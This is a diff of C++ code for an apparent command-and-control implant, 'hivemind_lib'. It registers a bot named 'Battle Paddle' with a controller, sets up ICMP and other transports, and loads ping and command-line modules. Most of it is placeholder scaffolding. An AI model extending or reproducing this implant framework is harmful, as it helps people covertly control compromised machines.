@@ -2,33 +2,18 @@
 
 namespace hivemind_lib {
 logic_controller::logic_controller() {
-  // TODO Remove this
-  ModuleInfo info;
-  info.moduleDesc = "This contains the functions added separately from a module";
-  info.moduleName = "EXTRA";
-  this->modules.insert({info.moduleName, info});
-  // Remove
   this->transportMethod = None;
-}
-
-void logic_controller::AddFunction(void *func) {
-  // TODO Remove this
-  ModuleFuncInfo func_info;
-  func_info.moduleFuncName = "Name here";
-  func_info.moduleFuncDesc = "No Description";
-  // Remove
-  this->modules.at("EXTRA").moduleFuncs.push_back(func_info);
 }
 
 int logic_controller::RegisterBot() {
   struct RegistrationRequest registration_request;
   struct Packet packet;
-  struct ImplantInfo implant_info = {};
+  this->implantInfo = {"", "192.168.7.1"};
 
   std::vector<ModuleInfo> values;
 
   for (const auto &kv : this->modules) {
-    values.push_back(kv.second);
+    values.push_back(kv.second->modInfo);
   }
 
   // TODO Get this stuff
@@ -36,6 +21,7 @@ int logic_controller::RegisterBot() {
   registration_request.MAC = "aa:ss:dd:ff:gg:hh";
   registration_request.implantVersion = "asdf";
   registration_request.IP = this->implantInfo.primaryIP;
+  registration_request.implantName = "Battle Paddle";
   registration_request.OS = "Windows trash";
   registration_request.supportedModules = values;
   //******************
@@ -44,7 +30,7 @@ int logic_controller::RegisterBot() {
 
   // TODO determine fingerprint
   packet.fingerprint = "fingerprint";
-  packet.implantInfo = implant_info;
+  packet.implantInfo = this->implantInfo;
   packet.numLeft = 0;
   packet.packetType = RegistrationRequestCode;
   packet.data = j.dump();
@@ -52,6 +38,7 @@ int logic_controller::RegisterBot() {
   nlohmann::json p = nlohmann::json(packet);
 
   auto response = this->transport->SendAndReceive(p.dump());
+  DEBUG(response, LEVEL_ERROR);
   try {
     nlohmann::json resp = nlohmann::json::parse(response);
     auto packetResp = resp.get<Packet>();
@@ -77,18 +64,30 @@ int logic_controller::RegisterBot() {
   return 0;
 }
 
+//TODO Implement this.
 void logic_controller::BeginComms() {
-
+  auto f = this->modules["PING"]->funcMap["PING"]("8.8.8.8");
 }
 
 void logic_controller::AddModule(ModuleEnum mod) {
   switch (mod) {
-    case All:DEBUG("Adding All Modules", LEVEL_DEBUG);
-    case Ping:DEBUG("Adding Ping Module", LEVEL_DEBUG);
+    case All: {
+      DEBUG("Adding All Modules", LEVEL_DEBUG);
+    }
+    case Ping: {
+      DEBUG("Adding Ping Module", LEVEL_DEBUG);
+      std::unique_ptr<Module> ping = std::make_unique<Ping_Module>();
+      auto info = ping->init();
+      this->modules.insert({ping->modInfo.moduleName, std::move(ping)});
       if (mod != All) break;
-    case CommandLine:DEBUG("Adding Command Line Module", LEVEL_DEBUG);
+    }
+    case CommandLine: {
+      DEBUG("Adding Command Line Module", LEVEL_DEBUG);
       break;
-    default:DEBUG("UNKNOWN MODULE", LEVEL_ERROR);
+    }
+    default: {
+      DEBUG("UNKNOWN MODULE", LEVEL_ERROR);
+    }
   }
 }
 
@@ -104,9 +103,11 @@ void logic_controller::InitComms(std::string hostname, std::string port) {
       break;
     case ICMP:this->transport = std::make_unique<Icmp_Transport>(std::move(hostname), std::move(port));
       break;
-    case None:
-      DEBUG("No transport method chosen", LEVEL_ERROR);
+    case None:DEBUG("No transport method chosen", LEVEL_ERROR);
       break;
   }
+}
+void logic_controller::AddFunction(std::function<std::string(std::string)> func) {
+
 }
 }
